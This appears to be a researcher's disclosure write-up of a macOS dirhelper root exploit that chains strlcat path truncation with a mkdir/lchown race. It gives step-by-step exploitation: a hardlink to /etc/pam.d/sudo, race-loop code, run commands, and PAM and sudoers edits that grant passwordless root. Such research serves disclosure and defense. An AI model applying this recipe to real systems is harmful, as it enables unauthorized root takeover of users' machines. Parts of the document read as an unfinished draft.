# Glarus: macOS dirhelper Privilege Escalation

## Executive Summary

**Glarus** is a local privilege escalation vulnerability chain in macOS's `dirhelper` system daemon that allows an unprivileged user to gain root access. The attack combines one/two vulnerabilities:

1. **CVE-PENDING-1**: Unchecked `strlcat()` return value leading to path truncation
2. **CVE-PENDING-2**: Time-of-check to time-of-use (TOCTOU) race condition between `mkdir()` and `lchown()`

**Impact**: User → Root privilege escalation  
**Attack Vector**: Local  
**Complexity**: Low (requires winning a race condition)  
**Affected Versions**: macOS 26 and lower [26.1 affected?]  

---

## Table of Contents

1. [Background](#background)
2. [Vulnerability Analysis](#vulnerability-analysis)
   - [Bug #1: String Truncation](#bug-1-string-truncation-via-unchecked-strlcat)
   - [Bug #2: TOCTOU Race Condition](#bug-2-toctou-race-condition)
3. [Exploitation Technique](#exploitation-technique)
   - [Attack Overview](#attack-overview)
   - [Hardlink Setup](#phase-1-hardlink-setup)
   - [Race Condition](#phase-2-race-condition-exploitation)
   - [Privilege Escalation](#phase-3-privilege-escalation)
4. [Technical Deep Dive](#technical-deep-dive)
   - [dirhelper Service Architecture](#dirhelper-service-architecture)
   - [MIG Interface Analysis](#mig-interface-analysis)
   - [Buffer Size Calculation](#buffer-size-calculation)
   - [Race Window Analysis](#race-window-analysis)
5. [Proof of Concept](#proof-of-concept)
6. [Mitigations](#mitigations)
7. [Detection](#detection)
8. [Timeline](#timeline)
9. [References](#references)

---

## Background

### What is dirhelper?

`dirhelper` is a macOS system daemon (`/usr/libexec/dirhelper`) that runs as root and provides directory management services to sandboxed applications. Its primary function is to create temporary directories for other applications and containers with appropriate ownership and permissions.

Sandboxed applications cannot always directly create directories in certain locations, so they communicate with `dirhelper` via Mach IPC (MIG - Mach Interface Generator) to request directory creation. The daemon creates the directory and sets ownership to the requesting user's UID/GID.

### Service Details

| Property | Value |
|----------|-------|
| Binary Path | `/usr/libexec/dirhelper` |
| Mach Service | `com.apple.bsd.dirhelper` |
| Runs As | root (uid=0) |
| MIG Message ID | 0xB872 (47218) |
| Launchd Label | `com.apple.bsd.dirhelper` |

### Attack Surface

The `dirhelper` daemon is an attractive target because:

1. **Runs as root** - Any vulnerability can lead to privilege escalation
2. **Accessible from sandbox** - Sandboxed apps can communicate with it via Mach IPC
3. **Performs filesystem operations** - Creates directories and changes ownership
4. **Processes untrusted input** - Buffer sizes and paths come from client requests

---

## Vulnerability Analysis

### Bug #1: String Truncation via Unchecked strlcat()

#### Description

The `dirhelper` daemon uses `strlcat()` to append "/tmp/" to container paths but does not check the return value. When the output buffer is sized precisely, the trailing "/" is truncated, resulting in a path ending in "/tmp" instead of "/tmp/".

#### Vulnerable Code Pattern

```c
// Pseudocode from reverse engineering
void handle_container_request(char *app_id, uint32_t buffer_size) {
    char path[buffer_size];  // Attacker-controlled size!
    
    // Get container path (e.g., "/Users/victim/Library/Containers/com.app/Data")
    sandbox_container_path_for_audit_token(audit_token, path, buffer_size);
    
    // Check if path ends with '/'
    size_t len = strlen(path);
    if (path[len-1] != '/') {
        strlcat(path, "/tmp/", buffer_size);  // ← VULNERABLE: Return value ignored!
    } else {
        strlcat(path, "tmp/", buffer_size);
    }
    
    // Create directory and set ownership
    _makeDirectoryWithUIDAndGID(path, uid, gid, 0700);
}
```

#### Root Cause

The `strlcat()` function returns the total length of the string it tried to create. If this exceeds the buffer size, truncation occurs. The code does not check this return value, so truncation goes undetected.

From the `strlcat(3)` man page:
> strlcat() appends string src to the end of dst. It will append at most dstsize - strlen(dst) - 1 characters. It will then NUL-terminate, unless dstsize is 0 or the original dst string was longer than dstsize.

#### Exploitation

By setting `buffer_size` to exactly `strlen(container_path) + 5`, the attacker causes:

| Buffer Size | Container Path | Append | Result |
|-------------|---------------|--------|--------|
| 74 | `/Users/x/Library/Containers/com.app/Data` (69 chars) | `/tmp/` | `/Users/x/.../Data/tmp` (73 chars + null) |

The calculation:
- Container path length: L
- String "/tmp/" to append: 5 characters
- Required for "/tmp/": L + 5 + 1 (null terminator)
- Buffer size to trigger truncation: L + 5 (drops the final "/")

#### Security Impact

Without the trailing slash, the path `/Users/.../Data/tmp` can refer to either:
- A **directory** named "tmp"
- A **file** named "tmp"
- A **symbolic link** named "tmp"
- A **hardlink** named "tmp"

This ambiguity is the foundation for the second vulnerability.

---

### Bug #2: TOCTOU Race Condition

#### Description

After constructing the path, `dirhelper` calls `mkdir()` to create the directory, then `lchown()` to set ownership. There is a race window between these operations where an attacker can swap the directory with another directory containing a hardlink to a privileged file.

#### Vulnerable Code Pattern

```c
int _makeDirectoryWithUIDAndGID(const char *path, uid_t uid, gid_t gid, mode_t mode) {
    int result;
    
    // Step 1: Create directory
    result = mkdir(path, mode);
    if (result != 0 && errno != EEXIST) {
        return -1;
    }
    
    // ← RACE WINDOW: Attacker can replace directory here!
    
    // Step 2: Change ownership
    result = lchown(path, uid, gid);  // ← Changes ownership of whatever is at 'path' now
    if (result != 0) {
        return -1;
    }
    
    return 0;
}
```

#### Root Cause

1. **Non-atomic operations**: `mkdir()` and `lchown()` are separate system calls
2. **Path-based operations**: Both operations use a path string, not a file descriptor
3. **No verification**: No check that the target is still the directory that was created

#### Race Window

```
Timeline:
─────────────────────────────────────────────────────────────────────────────
dirhelper:     mkdir("/Data/tmp")     [gap]     lchown("/Data/tmp", 501, 20)
                      │                  │                    │
                      ▼                  ▼                    ▼
Filesystem:    Directory created    Attacker swaps    lchown changes ownership
               at /Data/tmp         Data ↔ Fake       of Fake/tmp (hardlink!)
─────────────────────────────────────────────────────────────────────────────
Attacker:                           mv Data Data_bak
                                    mv Fake Data
```

#### The Swap Technique

**Note:** Apple's sandbox infrastructure blocks creating symlinks named "Data" 
in container directories. We use `rename()` instead:

1. **Before**: `Data/tmp` is a directory created by `mkdir()`
2. **Swap**: 
   - `rename(Data, Data_backup)` - Move real Data out of the way
   - `rename(Fake, Data)` - Move prepared Fake into position
3. **After**: `Data/tmp` now refers to what was `Fake/tmp`
4. **Result**: `lchown("Data/tmp")` changes ownership of our hardlink

If `Fake/tmp` is a hardlink to `/etc/pam.d/sudo`, the attacker now owns that file.

#### Security Impact

The attacker can change ownership of arbitrary files to their own UID, enabling:
- Modification of system configuration files
- Privilege escalation via PAM, sudoers, or other security-critical files
- Persistent backdoor installation

---

## Exploitation Technique

### Attack Overview

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                        Glarus Exploitation Flow                              │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  ┌──────────────┐      ┌──────────────┐      ┌──────────────┐              │
│  │   Phase 1    │      │   Phase 2    │      │   Phase 3    │              │
│  │   Setup      │ ───▶ │   Race       │ ───▶ │   Escalate   │              │
│  │              │      │   Condition  │      │              │              │
│  └──────────────┘      └──────────────┘      └──────────────┘              │
│         │                     │                     │                       │
│         ▼                     ▼                     ▼                       │
│  • Create Fake/tmp      • Trigger dirhelper   • Modify owned file          │
│    hardlink to          • Win mkdir→lchown    • Add NOPASSWD rule          │
│    /etc/pam.d/sudo        race                • Execute sudo               │
│                         • Swap Data→Fake                                    │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Phase 1: Hardlink Setup

The attacker creates a hardlink from `Fake/tmp` to the target privileged file. This must be done from an **unsandboxed** process because the App Sandbox blocks hardlinks to system files.

#### Directory Structure

```
~/Library/Containers/com.example.dirhelper-client/
├── Data/                    ← Real container data directory
│   └── (empty, or app data)
└── Fake/
    └── tmp                  ← Hardlink to /etc/pam.d/sudo (same inode!)
```

#### Why Hardlinks?

Hardlinks are essential because:

1. **Same inode**: A hardlink shares the same inode as the target file
2. **lchown behavior**: `lchown()` on a hardlink changes ownership of the underlying inode
3. **Survives renames**: Unlike symlinks, hardlinks reference the file data directly

```bash
# Create hardlink
ln /etc/pam.d/sudo ~/Library/Containers/.../Fake/tmp

# Verify same inode
stat -f "%i" /etc/pam.d/sudo           # e.g., 12345
stat -f "%i" ~/Library/.../Fake/tmp    # e.g., 12345 (same!)
```

#### Sandbox Restrictions

Sandboxed applications cannot create hardlinks to files outside their container. This is enforced by the kernel's sandbox extension, not just file permissions:

```c
// Inside sandbox: EPERM regardless of file permissions
link("/etc/pam.d/sudo", "./Fake/tmp");  // Returns -1, errno=EPERM
```

This is why the setup phase requires an unsandboxed helper binary.

### Phase 2: Race Condition Exploitation

#### Triggering dirhelper

The attacker triggers `dirhelper` via Mach IPC with a carefully calculated buffer size:

```c
// MIG call to dirhelper
kern_return_t kr = dhelper_create_temp_directory(
    service_port,
    audit_token,
    (vm_offset_t)app_id,
    strlen(app_id) + 1,
    truncation_buffer_size,  // Triggers path truncation
    &result_path,
    &result_path_len
);
```

#### Buffer Size Calculation

```c
// Container path for bundle ID "com.example.dirhelper-client":
// /Users/<user>/Library/Containers/com.example.dirhelper-client/Data

size_t container_len = strlen(container_path);  // e.g., 69
size_t buffer_size = container_len + 5;         // 74 → truncates "/tmp/" to "/tmp"
```

#### Race Binary Operation

The C-based race binary performs the swap with microsecond precision:

```c
// Tight loop monitoring for directory creation
while (running) {
    if (stat(target_path, &st) == 0 && S_ISDIR(st.st_mode)) {
        // Directory exists! Execute swap immediately
        rename(data_dir, data_backup);      // Move Data out of the way
        rename(fake_dir, data_dir);         // Move Fake into position as Data
        
        // lchown() now operates on Fake/tmp (our hardlink)
        
        if (check_target_ownership() == our_uid) {
            // We won!
            return SUCCESS;
        }
        
        // Didn't win, restore and retry
        undo_swap();
    }
}
```

**Note:** We use `rename()` instead of `symlink()` because Apple's sandbox 
infrastructure blocks creating symlinks named "Data" in container directories.

#### Timing Considerations

| Operation | Approximate Time |
|-----------|------------------|
| `mkdir()` syscall | ~10-50 μs |
| Race window | ~10-100 μs |
| `lchown()` syscall | ~10-50 μs |
| Shell script swap | ~1-10 ms (too slow!) |
| C binary swap | ~1-10 μs (fast enough) |

The race window is typically 10-100 microseconds. A shell script using `mv` and `ln` takes milliseconds due to fork/exec overhead, which is why a compiled C binary is required.

### Phase 3: Privilege Escalation

Once the attacker owns `/etc/pam.d/sudo`, they can modify it to bypass root authentication:

#### Modifying PAM Configuration

```bash
# Original /etc/pam.d/sudo:
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
...

# Modified (prepend this line):
auth       sufficient     pam_permit.so    ← Allows any authentication
```

#### Escalating to Root

```bash
# After modifying /etc/pam.d/sudo:
$ sudo -s
# (no password required)
# whoami
root
```

#### Alternative Targets

If `/etc/pam.d/sudo` is protected, other targets include:

| Target File | Exploitation Method |
|-------------|---------------------|
| `/etc/sudoers` | Add `user ALL=(ALL) NOPASSWD: ALL` |
| `/etc/pam.d/su` | Same as sudo PAM modification |
| `/Library/LaunchDaemons/*.plist` | Create root-level launch daemon |
| `/etc/synthetic.conf` | Create synthetic firmlinks |

---

## Technical Deep Dive

### dirhelper Service Architecture

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                        dirhelper Service Architecture                        │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  Sandboxed App                    dirhelper Daemon                           │
│  ┌────────────┐                   ┌────────────────────┐                    │
│  │            │   Mach IPC        │                    │                    │
│  │  Client    │ ─────────────────▶│  MIG Server        │                    │
│  │  (MIG)     │   msg_id=0xB872   │                    │                    │
│  │            │                   │  ┌──────────────┐  │                    │
│  └────────────┘                   │  │ Request      │  │                    │
│       │                           │  │ Handler      │  │                    │
│       │                           │  └──────┬───────┘  │                    │
│       │                           │         │          │                    │
│       │                           │  ┌──────▼───────┐  │                    │
│       │                           │  │ Path         │  │                    │
│       │                           │  │ Construction │◀─┼── strlcat() bug    │
│       │                           │  └──────┬───────┘  │                    │
│       │                           │         │          │                    │
│       │                           │  ┌──────▼───────┐  │                    │
│       │                           │  │ mkdir()      │  │                    │
│       │                           │  └──────┬───────┘  │                    │
│       │                           │         │          │   ← Race window    │
│       │                           │  ┌──────▼───────┐  │                    │
│       │                           │  │ lchown()     │◀─┼── TOCTOU bug       │
│       │                           │  └──────────────┘  │                    │
│       │                           │                    │                    │
│       │                           └────────────────────┘                    │
│       │                                                                      │
│       ▼                                                                      │
│  Container Directory: ~/Library/Containers/<bundle-id>/Data/tmp              │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

### MIG Interface Analysis

The `dirhelper` daemon exposes a MIG interface for IPC:

#### Message Structure

```c
// Request message (client → server)
struct dirhelper_request {
    mach_msg_header_t header;       // Standard Mach message header
    uint32_t ndr[2];                // NDR format specifier
    uint32_t type;                  // 1=container, 2=cache
    uint32_t flags;                 // Request flags
    uint32_t pad;                   // Padding
    uint32_t path_length;           // Length of app_id string
    char app_id[path_length];       // Bundle identifier
    uint32_t output_buffer_size;    // ← Attacker controls this!
};

// Reply message (server → client)
struct dirhelper_reply {
    mach_msg_header_t header;
    mach_msg_body_t body;
    uint32_t ndr[2];
    uint32_t return_code;           // 0 on success
    uint32_t path_offset;
    char created_path[];            // Path that was created
};
```

#### macOS 26 Reply Port Semantic Changes

macOS 26 introduced `REQUIRE_REPLY_PORT_SEMANTICS` which enforces that reply ports must be obtained through MIG infrastructure. Attempting to backport Glarus to earlier macOS versions will require changes here.

```c
// Old code (crashes on macOS 26):
mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &reply_port);

// Fixed code:
#include <mach/mig.h>
reply_port = mig_get_reply_port();  // Proper MIG reply port
```

### Buffer Size Calculation

#### Path Components

```
Container path structure:
/Users/<username>/Library/Containers/<bundle-id>/Data

Example for user "victim" with bundle "com.example.dirhelper-client":
/Users/victim/Library/Containers/com.example.dirhelper-client/Data

Length breakdown:
  /Users/         = 7
  victim/         = 7  (varies)
  Library/        = 8
  Containers/     = 11
  com.example.../ = 32 (varies)
  Data            = 4
  ─────────────────────
  Total           = 69 characters (example)
```

#### Truncation Math

```
Goal: Cause "/tmp/" (5 chars) to truncate to "/tmp" (4 chars)

Given:
  - Container path length: L
  - String to append: "/tmp/" (5 characters)
  - Null terminator: 1 byte

Full path without truncation:
  L + 5 + 1 = L + 6 bytes needed

To truncate final "/":
  buffer_size = L + 5
  
  strlcat behavior with buffer_size = L + 5:
    - Available space: buffer_size - L - 1 = 4 characters
    - Can only fit: "/tmp" (4 chars) + null
    - Result: "/tmp\0" (truncated!)
```

### Race Window Analysis

#### System Call Trace

Using DTrace, we can observe the race window:

```
[dirhelper] mkdir("/Users/victim/Library/Containers/.../Data/tmp", 0700)
  → returns 0 (success)
                                    ← RACE WINDOW START
[dirhelper] lchown("/Users/victim/Library/Containers/.../Data/tmp", 501, 20)
                                    ← RACE WINDOW END
  → returns 0 (success, but operated on attacker's hardlink!)
```

#### Window Duration

The race window duration depends on:

1. **Kernel scheduling**: Context switches between syscalls
2. **System load**: More processes = more scheduling opportunities
3. **Storage speed**: Slower I/O = longer window

Typical measurements:
- Idle system: 10-50 μs window
- Loaded system: 50-200 μs window
- Under memory pressure: 100-500 μs window

#### Success Rate

With the C race binary, typical success rates are:

| Conditions | Attempts to Win | Success Rate |
|------------|-----------------|--------------|
| Idle VM | 1,000-10,000 | ~0.01-0.1% |
| Loaded system | 100-1,000 | ~0.1-1% |
| Heavy I/O | 50-500 | ~1-5% |

---

## Proof of Concept

### Components

| File | Purpose |
|------|---------|
| `dirhelper_client_v3.c` | MIG client with macOS 26 compatibility |
| `race_swap.c` | Fast C-based race condition binary |
| `setup_hardlink.sh` | Creates hardlink structure |
| `run_glarus.sh` | Orchestrates the complete attack |

### Build Instructions

```bash
# 1. Build dirhelper client
./build_v3.sh

# 2. Compile race binary
clang -O3 -o race_swap race_swap.c

# 3. Set up hardlink (requires unsandboxed execution)
./setup_hardlink.sh /etc/pam.d/sudo
```

### Execution

```bash
# Run complete exploit
./run_glarus.sh 50000 spin

# Or run components manually:
# Terminal 1: Race binary
./race_swap -m spin -n 100000

# Terminal 2: Trigger loop
CONTAINER="$HOME/Library/Containers/com.example.dirhelper-client/Data"
SIZE=$(( ${#CONTAINER} + 5 ))
for i in $(seq 1 10000); do
    ./build/DirhelperClient.app/Contents/MacOS/DirhelperClient \
        com.example.testapp 1 $SIZE 2>/dev/null
done
```

### Expected Output

```
╔══════════════════════════════════════════════════════════════╗
║            🎉 RACE WON! 🎉                                   ║
╚══════════════════════════════════════════════════════════════╝

Target file: /etc/pam.d/sudo
New owner:   uid=501 (you)
Attempts:    3847
Swaps:       156
```

---

## Mitigations

### Recommended Fixes for Apple

#### Fix #1: Check strlcat() Return Value

```c
// Before (vulnerable):
strlcat(path, "/tmp/", buffer_size);

// After (fixed):
size_t result = strlcat(path, "/tmp/", buffer_size);
if (result >= buffer_size) {
    // Truncation occurred - reject request
    return EINVAL;
}
```



## Timeline

| Date | Event |
|------|-------|
| Aug 08, 2025| dirhelper root escalation leveraging Full Disk Access (FDA) discovered and reported to Apple|
| Sep 09, 2025 | Apple asks for additional information about TCC and FDA conditions to exploit  |
| Oct 16, 2025 | Provided new Glarus exploit technique (OE11004064159426) to Apple allowing root escalation without FDA |
| Dec 12, 2025 | Apple pushes update 26.2 crediting Golden Helm Securities with assistance but not offering CVE |
| ??? | Exploit Code and Writeup released|

---

## References

### Related Vulnerabilities

- **CVE-2019-8565**: Similar TOCTOU in Feedback Assistant
- **CVE-2020-9839**: dirhelper sandbox escape (related service)

### Technical Resources

- [Apple MIG Documentation](https://developer.apple.com/library/archive/documentation/Darwin/Conceptual/KernelProgramming/Mach/Mach.html)
- [strlcat(3) man page](https://man.openbsd.org/strlcat.3)
- [TOCTOU Race Conditions](https://cwe.mitre.org/data/definitions/367.html)

### Tools Used

- **DTrace**: System call tracing for timing analysis
- **Hopper/IDA**: Reverse engineering dirhelper binary
- **LLDB**: Dynamic analysis and debugging

---


## Credits

- Vulnerability Research and Exploit Development: Golden Helm Securities


---

*Document Version: 1.0*
*Last Updated: [Date]*
